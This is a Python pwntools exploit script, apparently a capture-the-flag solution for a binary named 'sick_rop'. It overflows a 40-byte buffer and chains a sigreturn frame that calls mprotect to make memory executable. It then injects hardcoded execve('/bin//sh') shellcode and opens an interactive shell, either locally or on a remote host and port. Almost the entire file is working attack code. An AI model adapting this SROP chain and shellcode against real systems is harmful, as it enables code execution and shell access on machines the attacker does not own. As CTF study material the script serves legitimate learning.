#!/usr/bin/python3

from pwn import *

context.clear(arch='amd64')
elf = context.binary = ELF('./sick_rop')


def start():
    file_name = './sick_rop'
    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            init-peda
            b *0x0040104e
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remote(host, port)
    return process(file_name)


def main():

    io = start()

    writable = 0x0400000
    syscall_ret = 0x401014

    frame = SigreturnFrame()
    frame.rax = 10
    frame.rdi = writable
    frame.rsi = 0x4000
    frame.rdx = 7
    frame.rsp = 0x4010d8 # value obtained by "find 0x40102e" command in gdb-peda
    frame.rip = syscall_ret

    payload = b'a' * 40 + p64(elf.symbols.vuln) + p64(syscall_ret) + bytes(frame)

    info(f'payload: {payload}')

    input('>')

    io.send(payload)
    io.recv()
    io.sendline(b'a' * 14)
    io.recv()
    # shellcode = flat(asm(shellcraft.sh()))

    shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

    info(f'shellcode length: {len(shellcode)}')

    shellcode = shellcode + b'a' * (40 - len(shellcode)) + p64(0x4010b8)

    info(f'the shellcode is {shellcode}')

    io.sendline(shellcode)
    io.recv()

    io.interactive()


if __name__ == '__main__':
    main()
